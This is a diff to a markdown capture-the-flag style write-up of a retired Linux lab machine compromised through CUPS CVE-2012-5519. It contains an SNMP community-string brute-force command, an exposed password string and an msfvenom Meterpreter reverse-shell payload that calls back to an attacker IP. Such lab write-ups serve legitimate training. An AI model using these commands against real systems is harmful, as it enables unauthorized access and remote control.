@@ -4,6 +4,8 @@ tags:
   - Retired
   - Linux
   - CUPS
+  - SMTP
+  - TELNET
 creation date: 2021-09-27
 Date Completed: 2024-08-31
 CVEs: CVE-2012-5519
@@ -51,11 +53,11 @@ Received reply to probe snmp-public (target port 161) from 10.129.44.204:161: 30
 P@ssw0rd@123!!123
 ```
 
-
 ```
 onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.129.44.204
 ```
 
+## Foothold
 
 ![[Pasted image 20240831100600.png]]
 ![[Pasted image 20240831100727.png]]
@@ -66,18 +68,18 @@ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-communit
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.64 LPORT=1337 -f ELF > shell
 ```
 
-## Priv Esc
+## Privilege Escalation
 
-ls -lah /etc/
+`ls -lah /etc/`
 cups stood out to me.
 ![[Pasted image 20240831104656.png]]
 
-ss -antp
+`ss -antp`
 tells me there's website running
 ![[Pasted image 20240831104735.png]]
 
 
-i tried portfwd in metasploit but it didn't work. so I curled the website on the victim system which got me the cups version. from there i reaseared CUPS v1.6.1 and found a CVE, PoC, and a metasploit module
+i tried portfwd in metasploit but it didn't work. so I curled the website on the victim system which got me the cups version. from there i reassured CUPS v1.6.1 and found a CVE, PoC, and a metasploit module
 
 ![[Pasted image 20240831104841.png]]
 ![[Pasted image 20240831104856.png]]
